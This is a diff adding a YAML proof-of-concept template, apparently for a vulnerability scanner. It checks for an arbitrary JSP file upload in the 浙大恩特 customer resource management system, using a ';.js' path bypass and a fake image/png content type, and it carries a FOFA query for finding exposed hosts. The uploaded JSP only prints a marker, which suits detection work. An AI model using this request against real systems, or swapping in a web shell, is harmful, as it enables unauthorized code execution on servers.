@@ -1,0 +1,68 @@
+id: poc-yaml-zhedaente-entsoft-machord-doc-upload
+info:
+  name: 浙大恩特客户资源管理系统 machord_doc.jsp 任意文件上传
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统"
+variables:
+  randstr: to_lower(random_str(10))
+  t1: random_int(10,100)
+requests:
+- method: POST
+  path: /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName={{.t1}}.jsp&strAffixStr&oprfilenam=null&gesnum
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11
+  data: '------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    Content-Disposition: form-data; name="oprfilenam"
+
+
+    null
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    Content-Disposition: form-data; name="uploadflg"
+
+
+    0
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    Content-Disposition: form-data; name="strAffixStr"
+
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    Content-Disposition: form-data; name="selfilenam"
+
+
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11
+
+    Content-Disposition: form-data; name="uploadfile"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    <%out.print("hello world{{.randstr}}");%>
+
+    ------WebKitFormBoundaryQzxXQpKIb1f32N11--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,`javascript:openbyStream(''/enterdoc/Machord//`)
+
+    '
+- method: GET
+  path: /enterdoc/Machord/{{.t1}}.jsp
+  expression: 'status_code == 200 &&
+
+    body == "hello world" + randstr
+
+    '
+transport: http
